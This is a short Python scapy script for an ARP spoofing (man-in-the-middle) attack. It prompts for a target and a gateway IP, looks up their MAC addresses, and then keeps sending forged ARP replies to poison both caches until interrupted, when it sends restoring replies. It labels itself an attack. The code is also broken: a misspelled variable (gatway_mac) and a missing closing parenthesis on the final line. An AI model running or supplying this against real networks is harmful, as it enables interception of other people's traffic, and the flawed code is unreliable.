from scapy.all import *
import sys

def mac_gather(ip):
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
    reply = srp(broadcast, timeout=2)
    return reply[0][0][1].hwsrc

def arp_reply(spoofed_ip, target_ip, target_mac):
    spoof_reply = ARP(op=2, psrc=spoofed_ip, pdst=target_ip, hwdst=target_mac)
    send(spoof_reply)

def arp_cure(src, src_mac, dst, dst_mac):
    cure = ARP(op=2, psrc=src, pdst=dst, hwsrc=src_mac, hwdst=dst_mac)
    send(cure, verbose=False)
def main():
#
    target = input("target ip : ")
    try:
        target_mac = mac_gather(target)
    except:
        print("unreachable!")
        sys.exit()
#
    gateway = input("gateway ip : ")
    try:
        gatway_mac = mac_gather(gateway)
    except:
        print("unreachable!")
        sys.exit()
#
    try:
        print("VCIOUSLY ARPING >:] !")
        while True:
            arp_reply(gateway, target, target_mac)
            arp_reply(target, gateway, gateway_mac)
    except KeyboardInterrupt:
        print("ARP ATTACK SUSPENDED :[")
        arp_cure(gateway, gateway_mac, target, target_mac)
        arp_cure(target, target_mac, gateway, gateway_mac
#
if __name__ == "__main__":
    main()
